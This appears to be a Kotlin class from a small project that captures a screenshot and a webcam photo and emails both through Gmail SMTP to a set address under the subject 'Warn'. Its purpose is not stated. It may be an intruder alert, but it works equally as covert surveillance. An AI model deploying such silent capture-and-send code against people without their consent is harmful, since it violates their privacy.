package kam.mail

import java.util.*
import kam.picture.Screenshot
import kam.picture.Selfi
import kam.picture.writeImage
import kam.struct.Email
import javax.activation.DataHandler
import javax.activation.FileDataSource
import javax.mail.*
import javax.mail.internet.MimeMessage
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMultipart

class Sender(email: Email, to: String) {
    init {
        val props = Properties()
        props["mail.smtp.auth"] = "true"
        props["mail.smtp.starttls.enable"] = "true"
        props["mail.smtp.host"] = "smtp.gmail.com"
        props["mail.smtp.port"] = "587"

        val session = Session.getInstance(props, object : Authenticator() {
            override fun getPasswordAuthentication(): PasswordAuthentication {
                return PasswordAuthentication(email.email, email.password)
            }
        })

        val fromAddress = InternetAddress(email.email)
        val toAddress = InternetAddress(to)

        val msg = MimeMessage(session)
        msg.setFrom(fromAddress)
        msg.setRecipient(Message.RecipientType.TO, toAddress)
        msg.subject = "Warn"
        msg.sentDate = Date()

        val messagePart = MimeBodyPart()
        messagePart.setText("")

        val screenshot = Screenshot()
        writeImage(screenshot.getImage(), "screen.png")
        val fileDataSourceScreen = FileDataSource("screen.png")

        val attachmentPartScreen = MimeBodyPart()
        attachmentPartScreen.dataHandler = DataHandler(fileDataSourceScreen)
        attachmentPartScreen.fileName = fileDataSourceScreen.name


        val selfi = Selfi()
        writeImage(selfi.getImage(), "selfi.png")
        val fileDataSourceSelfi = FileDataSource("selfi.png")

        val attachmentPartSelfi = MimeBodyPart()
        attachmentPartSelfi.dataHandler = DataHandler(fileDataSourceSelfi)
        attachmentPartSelfi.fileName = fileDataSourceSelfi.name

        val multipart = MimeMultipart()
        multipart.addBodyPart(messagePart)
        multipart.addBodyPart(attachmentPartScreen)
        multipart.addBodyPart(attachmentPartSelfi)

        msg.setContent(multipart)

        Transport.send(msg)
    }
}